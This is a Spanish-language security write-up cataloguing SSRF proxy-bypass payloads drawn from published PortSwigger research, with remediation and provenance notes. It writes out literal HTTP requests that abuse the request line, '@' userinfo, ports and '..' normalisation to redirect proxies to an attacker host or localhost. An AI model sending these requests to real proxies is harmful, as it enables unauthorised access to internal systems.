---
clase: ssrf
tech: proxies-varios
cwe: CWE-918
cvss: 8.6 # [derivado] $8,000 para la variante '@' en Yahoo segun la fuente
payload: |
  # ADVERTENCIA (H1): el render colapso los saltos de linea. Reconstruida.
  # Todas las peticiones son LITERALES de la fuente.
  #
  # ---- 1) URL ABSOLUTA EN LA LINEA DE PETICION (US DoD) ----
  GET http://internal-website.mil/ HTTP/1.1
  Host: xxxxxxx.mil
  Connection: close
  #
  # Cita LITERAL de la fuente: 'Some servers effectively whitelist the host header, but
  # forget that the request line can also specify a host that takes precedence over the
  # host header.'
  # La allowlist de Host funciona perfectamente — y es irrelevante.
  #
  # ---- 2) '@' EN EL OBJETIVO (New Relic, y 17 servidores de Yahoo) ----
  GET @burp-collaborator.net/ HTTP/1.1
  Host: newrelic.com
  Connection: close
  #
  # Mecanica LITERAL: la reescritura producia 'http://public-backend@burp-collaborator.net/',
  # donde lo que parece el host pasa a ser USERINFO y el host real es el del atacante.
  # Causa raiz: Apache HttpComponents 'failed to require that paths start with "/"'.
  #
  # ---- 3) PUERTO CON '@' EN EL HOST (Incapsula) ----
  GET / HTTP/1.1
  Host: incapsula-client.net:80@burp-collaborator.net
  Connection: close
  # El backend lo convertia en 'http://incapsula-client.net:80@burp-collaborator.net/'.
  #
  # ---- 4) PUERTO EN EL OBJETIVO (GlobaLeaks) ----
  GET xyz.burpcollaborator.net:80/bar HTTP/1.1
  Host: demo.globaleaks.org
  Connection: close
  # Lookups DNS observados, LITERALES (notese la aleatorizacion de mayusculas del
  # resolver, que es una defensa anti-spoofing, no parte del ataque):
  #   xYZ.BurpcoLLABoRaTOR.neT.    from 89.234.157.254
  #   Xyz.burPColLABorAToR.nET.    from 62.210.18.16
  #   xYz.burpColLaBorATOR.net.    from 91.224.149.254
  #
  # ---- 5) NORMALIZACION DE RUTA (Yahoo, $5,000) ----
  GET / HTTP/1.1
  Host: ../?x=.vcap.me
  Connection: close
  # Observado en el Collaborator, LITERAL (el '?=x=' asi lo imprime la fuente):
  #   GET /vcap.me/../?=x=.vcap.me   Host: outage.vcap.me   Via: o2-b.ycpi.tp2.yahoo.net
  # Prosa LITERAL: 'After normalization, the URL becomes http://outage.vcap.me/?x=whatever.'
  # Y la clave del truco: los subdominios de vcap.me resuelven a 127.0.0.1, asi que
  # esto 'is equivalent to fetching http://127.0.0.1/'.
  #
  # NO aparece en el paper: ninguna peticion con 'Host: localhost', ni la cabecera
  # X-Forwarded-Host, ni ninguna forma de 'Host override via line wrapping'.
precondicion: "El proxy construye la URL de destino concatenando o reescribiendo partes de la peticion, y el parser que decide el host difiere del que aplica la validacion. Cada variante explota una ambiguedad distinta de la sintaxis de URL: precedencia de la linea de peticion, userinfo con '@', puerto, o normalizacion de '..'."
como_se_descubre: |
  Collaborator Everywhere inyecta identificadores unicos en todo el trafico y
  correlaciona los pingbacks automaticamente. Con cuatro variantes sintacticas a
  probar y un identificador distinto por variante, una sola pasada dice cual funciona.
  El patron que unifica las cinco y lo hace reutilizable: la sintaxis de URL tiene
  VARIOS sitios donde puede vivir un host — la linea de peticion, la cabecera Host, el
  userinfo antes de '@', y lo que resulte de normalizar '..'. Un validador mira UNO.
  Es el mismo principio 19 de docs/ELITE-MINDSET.md: donde dos componentes leen el
  mismo dato de forma distinta, hay un hallazgo.
  El truco de vcap.me merece recordarse aparte: es un dominio cuyos subdominios
  resuelven a 127.0.0.1, asi que convierte un bypass de allowlist de DOMINIO en
  acceso a localhost sin necesitar una IP literal (que suele estar filtrada).
control_negativo: |
  # [derivado] diseño de test A/B
  # A: GET @host-controlado/ HTTP/1.1 con Host: dominio-permitido
  #    -> llega interaccion al host controlado = la variante funciona
  # B: GET / HTTP/1.1 con Host: host-controlado
  #    -> BLOQUEADO; demuestra que la allowlist de Host existe y funciona
  # C: GET / HTTP/1.1 con Host: dominio-permitido -> normal
  # El par A/B es el informe: B prueba que hay un control, A que se esquiva por otra
  # via sintactica. Sin B, el hallazgo se lee como 'no habia validacion'.
mata: |
  - El proxy resuelve el destino desde configuracion y no desde la peticion.
  - El parser que valida y el que conecta son el MISMO y leen el mismo campo.
  - Apache HttpComponents parcheado (la fuente cita HTTPCLIENT-1803 como corregido).
  - Segmentacion de red: aunque el bypass funcione, no hay nada interno alcanzable.
  - La aleatorizacion de mayusculas del resolver NO mata nada: es una defensa
    anti-spoofing de DNS, no afecta a esta clase.
fuente: "https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface (James Kettle, 2017-07-27, act. 2025-09-03). Todas las peticiones literales. Recompensas LITERALES: $8,000 por la variante '@' en Yahoo (17 servidores), $5,000 por la normalizacion de ruta. New Relic: 'New Relic don't pay cash bounties', parcheado en festivo; libreria corregida como HTTPCLIENT-1803. US DoD, Incapsula y GlobaLeaks: sin recompensa indicada. SIN CVE en todo el articulo."
confianza: media
fecha: 2026-11-02
---
# [SSRF] Cuatro ambigüedades de la sintaxis de URL — `@`, URL absoluta, puerto y `..`

## Principio
La sintaxis de URL tiene **varios sitios donde puede vivir un host**: la línea de
petición, la cabecera `Host`, el *userinfo* antes de una `@`, y lo que resulte de
normalizar `..`. Un validador mira uno. El cliente HTTP que conecta puede mirar otro.

Es el principio 19 de `docs/ELITE-MINDSET.md` aplicado a la URL, y la razón de que esta
clase siga apareciendo veinte años después de documentarse.

## Payloads
**URL absoluta en la línea de petición** (US DoD):

```http
GET http://internal-website.mil/ HTTP/1.1
Host: xxxxxxx.mil
Connection: close
```

Cita literal: *"Some servers effectively whitelist the host header, but forget that the
request line can also specify a host that takes precedence over the host header."* La
allowlist de `Host` funciona perfectamente — y es irrelevante.

**`@` en el objetivo** (New Relic, y 17 servidores de Yahoo, $8.000):

```http
GET @burp-collaborator.net/ HTTP/1.1
Host: newrelic.com
Connection: close
```

La reescritura producía `http://public-backend@burp-collaborator.net/`: lo que parece el
host pasa a ser *userinfo*, y el host real es el del atacante. Causa raíz en Apache
HttpComponents, que *"failed to require that paths start with '/'"*.

**Puerto con `@` en el Host** (Incapsula):

```http
GET / HTTP/1.1
Host: incapsula-client.net:80@burp-collaborator.net
Connection: close
```

**Puerto en el objetivo** (GlobaLeaks):

```http
GET xyz.burpcollaborator.net:80/bar HTTP/1.1
Host: demo.globaleaks.org
Connection: close
```

**Normalización de ruta** (Yahoo, $5.000):

```http
GET / HTTP/1.1
Host: ../?x=.vcap.me
Connection: close
```

## El truco de `vcap.me`
Los subdominios de `vcap.me` resuelven a **127.0.0.1**. Así que el payload anterior, en
palabras de la fuente, *"is equivalent to fetching http://127.0.0.1/"*.

Esto merece recordarse como primitiva independiente: convierte un bypass de allowlist de
**dominio** en acceso a localhost sin necesitar una IP literal — que es justo lo que
suelen filtrar los deny-lists documentados en
`writeups/ssrf/metadata-cloud-imds-169-254-169-254.md`. Un filtro que bloquea
`127.0.0.0/8` no bloquea un nombre de dominio que resuelve ahí.

## Una observación que no es parte del ataque
Los lookups DNS observados llegan con las mayúsculas aleatorizadas:

```
xYZ.BurpcoLLABoRaTOR.neT.    from 89.234.157.254
```

No es ofuscación del atacante ni del objetivo: es **DNS 0x20**, una defensa anti-spoofing
del resolver. Lo señalo porque es fácil leerlo como parte del payload y no lo es.

## Impacto
Acceso a sistemas internos a través del proxy. Recompensas literales: $8.000 por la
variante `@` en Yahoo, $5.000 por la normalización de ruta. New Relic no paga en efectivo
y parcheó en festivo; la librería se corrigió como HTTPCLIENT-1803.

## Nota de procedencia
El paper **no contiene** ninguna petición con `Host: localhost`, ni la cabecera
`X-Forwarded-Host`, ni ninguna forma de "Host override via line wrapping". Las tres
circulan asociadas a este trabajo; no están en él.

## Remediación
La del paper: aislar los proxies inversos en una DMZ endurecida. `# [derivado]`: y a
nivel de código, resolver el destino desde configuración en lugar de reconstruirlo desde
la petición — porque cada variante de este writeup es una forma distinta de la misma
reconstrucción.
